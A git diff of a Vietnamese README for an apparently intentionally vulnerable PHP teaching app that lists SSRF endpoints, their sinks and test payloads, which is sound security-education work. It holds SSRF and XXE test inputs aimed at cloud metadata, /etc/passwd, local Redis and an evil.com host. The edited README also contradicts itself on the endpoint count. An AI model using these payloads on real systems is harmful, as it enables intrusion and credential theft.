@@ -4,9 +4,9 @@
 
 Web application demo cho NT213 - Bảo mật web và ứng dụng.
 
-- **Tổng số lỗ hổng SSRF:** 9 endpoints
-- **Files chứa SSRF:** 4 files (profile.php, contact.php, checkout.php, admin_products.php)
-- **PHP sinks sử dụng:** 10 loại khác nhau
+- **Tổng số lỗ hổng SSRF:** 4 endpoints
+- **Files chứa SSRF:** 2 files (profile.php, admin_products.php)
+- **PHP sinks sử dụng:** 5 loại khác nhau
 - **Công cụ testing:** SSRFuzz (IEEE S&P 2024)
 - **Crawlergo compatible:** Tất cả parameters đều discoverable
 
@@ -14,63 +14,32 @@ Web application demo cho NT213 - Bảo mật web và ứng dụng.
 
 ## Chi tiết SSRF Vulnerabilities
 
-### 1. profile.php - 2 vulnerabilities
+### 1. profile.php - 1 vulnerability
 
 #### Vuln #1: Upload Avatar from URL
 - **Sink:** `getimagesize()` + `file_get_contents()`
-- **Parameter:** POST `avatar_url`
-- **Test:** `curl -X POST http://localhost/profile.php -d "avatar_url=http://metadata.google.internal/"`
-
-#### Vuln #2: Import Profile JSON
-- **Sink:** `file_get_contents()` + `json_decode()`
-- **Parameter:** POST `import_json`
-- **Test:** `curl -X POST http://localhost/profile.php -d "import_json=http://internal-api/data.json"`
+- **Parameter:** GET `avatar_url`
+- **Test:** `?avatar_url=http://metadata.google.internal/`
+- **Purpose:** Upload ảnh đại diện từ URL
 
 ---
 
-### 2. contact.php - 2 vulnerabilities
+### 2. admin_products.php - 3 vulnerabilities
 
-#### Vuln #3: Attach File from URL
-- **Sink:** `readfile()`
-- **Parameter:** POST `attachment_url`
-- **Test:** `curl -X POST http://localhost/contact.php -d "attachment_url=file:///etc/passwd"`
-
-#### Vuln #4: External Verification Service
-- **Sink:** `file()`
-- **Parameter:** POST `verify_captcha`
-- **Test:** `curl -X POST http://localhost/contact.php -d "verify_captcha=http://captcha-api.internal/verify"`
-
----
-
-### 3. checkout.php - 2 vulnerabilities
-
-#### Vuln #5: Payment Gateway Verify
-- **Sink:** `get_headers()`
-- **Parameter:** GET `payment_verify`
-- **Test:** `?payment_verify=http://internal-payment-gateway:9200/_cluster/health`
-
-#### Vuln #6: Shipping Rate API
-- **Sink:** `fsockopen()`
-- **Parameter:** POST `shipping_api`
-- **Test:** `curl -X POST http://localhost/checkout.php -d "shipping_api=http://127.0.0.1:6379/"`
-
----
-
-### 4. admin_products.php - 3 vulnerabilities
-
-#### Vuln #7: Validate Image/XML
+#### Vuln #2: Validate Image/XML
 - **Sink:** `simplexml_load_file()` / `imagecreatefromstring()`
 - **Parameter:** GET `validate_image`
 - **Test (XXE):** `?validate_image=http://evil.com/xxe.xml`
 - **Test (Image):** `?validate_image=http://internal-storage/secret.png`
+- **Purpose:** Kiểm tra URL hình ảnh hợp lệ (hỗ trợ .jpg, .png, .xml)
 
-#### Vuln #8: Sync Product from Supplier
+#### Vuln #3: Sync Product from Supplier
 - **Sink:** `file_get_contents()`
 - **Parameter:** GET `sync_product`
 - **Test:** `?sync_product=http://api.shopee.vn/product/12345`
 - **Purpose:** Đồng bộ thông tin sản phẩm từ nhà cung cấp (Shopee, Lazada, 1688)
 
-#### Vuln #9: Check Warehouse Stock
+#### Vuln #4: Check Warehouse Stock
 - **Sink:** `curl_exec()`
 - **Parameter:** GET `check_warehouse`
 - **Test:** `?check_warehouse=http://warehouse-internal.local/api/stock/SKU123`
@@ -82,18 +51,13 @@ Web application demo cho NT213 - Bảo mật web và ứng dụng.
 
 | Sink Function | Files | Status |
 |--------------|-------|--------|
-| `file_get_contents()` | profile.php, admin_products.php | ✅ |
-| `curl_exec()` | admin_products.php | ✅ |
 | `getimagesize()` | profile.php | ✅ |
-| `readfile()` | contact.php | ✅ |
-| `file()` | contact.php | ✅ |
-| `get_headers()` | checkout.php | ✅ |
-| `fsockopen()` | checkout.php | ✅ |
+| `file_get_contents()` | profile.php, admin_products.php | ✅ |
 | `simplexml_load_file()` | admin_products.php | ✅ |
 | `imagecreatefromstring()` | admin_products.php | ✅ |
-| `json_decode()` | profile.php, admin_products.php | ✅ |
+| `curl_exec()` | admin_products.php | ✅ |
 
-**Coverage:** 10/86 sinks từ SSRFuzz research (11.6%)
+**Coverage:** 5/86 sinks từ SSRFuzz research (5.8%)
 
 ---
 
@@ -135,24 +99,24 @@ Tất cả 9 parameters đều có trong HTML:
 
 | File | Parameter | Method | Discovery |
 |------|-----------|--------|-----------|
-| profile.php | avatar_url | POST | Visible input |
-| profile.php | import_json | POST | Hidden input |
-| contact.php | attachment_url | POST | Hidden input |
-| contact.php | verify_captcha | POST | Hidden input |
+| profile.php | avatar_url | GET | onclick button |
+| profile.php | import_json | GET | onclick button |
+| contact.php | attachment_url | GET | onclick button |
+| contact.php | verify_captcha | GET | onclick button |
 | checkout.php | payment_verify | GET | Hidden link |
-| checkout.php | shipping_api | POST | Hidden input |
-| admin_products.php | validate_image | GET | onclick button + --form-values |
-| admin_products.php | sync_product | GET | onclick button + --form-values |
-| admin_products.php | check_warehouse | GET | onclick button + --form-values |
+| checkout.php | shipping_api | GET | onclick button |
+| admin_products.php | validate_image | GET | onclick button |
+| admin_products.php | sync_product | GET | onclick button |
+| admin_products.php | check_warehouse | GET | onclick button |
 
 **Discovery rate: 9/9 (100%)**
 
 **Cách chạy crawlergo:**
 ```bash
-crawlergo -c /usr/bin/chromium-browser --log-level debug -t 20 -m 200 --event-trigger-mode sync --event-trigger-interval 200ms --before-exit-delay 10s --output-mode json http://localhost:8000/
+crawlergo -c /usr/bin/chromium-browser --log-level debug -t 20 -m 400 --event-trigger-mode async --event-trigger-interval 200ms --before-exit-delay 10s --output-mode json --output-json ssrf_full.json http://localhost:8000/dashboard.php
 ```
 
-**Giải thích options:**
+r**Giải thích options:**
 - `-c /usr/bin/chromium-browser` - Sử dụng Chrome/Chromium
 - `--log-level debug` - Hiển thị log chi tiết
 - `-t 20` - Timeout 20 giây
